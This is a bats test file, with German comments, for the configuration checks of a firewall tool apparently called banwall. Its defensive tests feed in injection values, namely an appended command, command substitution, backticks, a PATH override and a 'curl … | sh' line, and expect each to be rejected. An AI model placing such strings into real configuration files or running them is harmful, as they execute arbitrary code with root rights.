#!/usr/bin/env bats
# Tests der Konfigurationsprüfung. Sie ist die erste Verteidigungslinie:
# was hier durchrutscht, landet ungeprüft in nftables oder sshd_config.

load helper
setup() { setup_banwall; }

@test "Standardwerte sind gültig" {
	run config_validate
	[ "$status" -eq 0 ]
}

@test "SSH-Port außerhalb der offenen Ports wird abgelehnt" {
	BANWALL_TCP_PORTS="80 443"
	BANWALL_SSH_PORT="22"
	run config_validate
	[ "$status" -eq 3 ]
	[[ "$output" == *"aussperren"* ]]
}

@test "ungültige Portnummer wird abgelehnt" {
	BANWALL_TCP_PORTS="22 99999"
	run config_validate
	[ "$status" -eq 3 ]
	[[ "$output" == *"ungültigen Port"* ]]
}

@test "Blocklist-URL ohne https wird abgelehnt" {
	BANWALL_BLOCKLIST_URLS="http://example.org/list.txt"
	run config_validate
	[ "$status" -eq 3 ]
	[[ "$output" == *"kein https"* ]]
}

@test "Blocklist-Modul ohne Quellen wird abgelehnt" {
	BANWALL_ENABLE_BLOCKLIST=1
	BANWALL_BLOCKLIST_URLS=""
	run config_validate
	[ "$status" -eq 3 ]
}

@test "Schalter akzeptiert nur 0 und 1" {
	BANWALL_ENABLE_SSH="ja"
	run config_validate
	[ "$status" -eq 3 ]
}

@test "Konfigurationsdatei mit falschen Rechten wird abgelehnt" {
	printf 'BANWALL_TCP_PORTS="22"\n' >"$BANWALL_CONFIG_FILE"
	chmod 0666 "$BANWALL_CONFIG_FILE"
	run config_load
	[ "$status" -eq 3 ]
	[[ "$output" == *"schreibbar"* ]]
}

@test "gültige Konfiguration wird geladen" {
	printf 'BANWALL_TCP_PORTS="22 8443"\n' >"$BANWALL_CONFIG_FILE"
	printf 'BANWALL_SSH_PORT="8443"\n' >>"$BANWALL_CONFIG_FILE"
	chmod 0600 "$BANWALL_CONFIG_FILE"
	run config_load
	[ "$status" -eq 0 ]
}

# --- Vorprüfung vor dem Sourcen -----------------------------------------
# Die Datei wird als root gesourct. Diese Tests halten fest, dass darin
# nichts stehen kann, was ausgeführt wird - sonst wäre Schreibrecht auf
# die Datei gleichbedeutend mit root.

konfig() {
	printf '%s\n' "$@" >"$BANWALL_CONFIG_FILE"
	chmod 0600 "$BANWALL_CONFIG_FILE"
}

@test "angehängtes Kommando hinter einer gültigen Zuweisung wird abgelehnt" {
	# Der gefährlichste Fall: die Zeile FÄNGT gültig an. Eine Prüfung,
	# die nur den Zeilenanfang ansieht, lässt das durch.
	konfig 'BANWALL_TCP_PORTS="22"; touch /tmp/banwall-test-beweis'
	rm -f /tmp/banwall-test-beweis
	run config_load
	[ "$status" -eq 3 ]
	[ ! -e /tmp/banwall-test-beweis ]
}

@test "Kommandosubstitution wird abgelehnt und nicht ausgeführt" {
	konfig 'BANWALL_TCP_PORTS="$(touch /tmp/banwall-test-beweis)"'
	rm -f /tmp/banwall-test-beweis
	run config_load
	[ "$status" -eq 3 ]
	[ ! -e /tmp/banwall-test-beweis ]
}

@test "Backticks werden abgelehnt" {
	konfig 'BANWALL_TCP_PORTS="`whoami`"'
	run config_load
	[ "$status" -eq 3 ]
}

@test "Zuweisung an eine fremde Variable wird abgelehnt" {
	konfig 'PATH=/boeser/pfad'
	run config_load
	[ "$status" -eq 3 ]
}

@test "freistehendes Kommando wird abgelehnt" {
	konfig 'BANWALL_ENABLE_SSH=1' 'curl http://example.org | sh'
	run config_load
	[ "$status" -eq 3 ]
	[[ "$output" == *"Zeile 2"* ]]
}

@test "übliche Werte gehen durch die Vorprüfung" {
	konfig \
		'# Kommentar' \
		'' \
		'BANWALL_TCP_PORTS="22 80 443"   # mit Zeilenkommentar' \
		'BANWALL_ALLOW_NETS="203.0.113.0/24 2001:db8::/32"' \
		'BANWALL_BLOCKLIST_INTERVAL="*-*-* 03:00:00"' \
		'BANWALL_BLOCKLIST_URLS="https://lists.example.org/all.txt"' \
		"BANWALL_SSH_ALLOW_USERS='admin deploy'" \
		'BANWALL_BLOCKLIST_MAX_BYTES=20971520'
	run config_load
	[ "$status" -eq 0 ]
}

@test "die mitgelieferte Beispielkonfiguration ist gültig" {
	# Fängt den Fall ab, dass die Vorprüfung verschärft wird und die
	# eigene Vorlage daran scheitert.
	install -m 0600 "$REPO_ROOT/share/banwall.conf.example" "$BANWALL_CONFIG_FILE"
	run config_load
	[ "$status" -eq 0 ]
}

@test "config_module_enabled folgt den Schaltern" {
	BANWALL_ENABLE_NFTABLES=1
	BANWALL_ENABLE_BLOCKLIST=0
	run config_module_enabled nftables
	[ "$status" -eq 0 ]
	run config_module_enabled blocklist
	[ "$status" -ne 0 ]
}
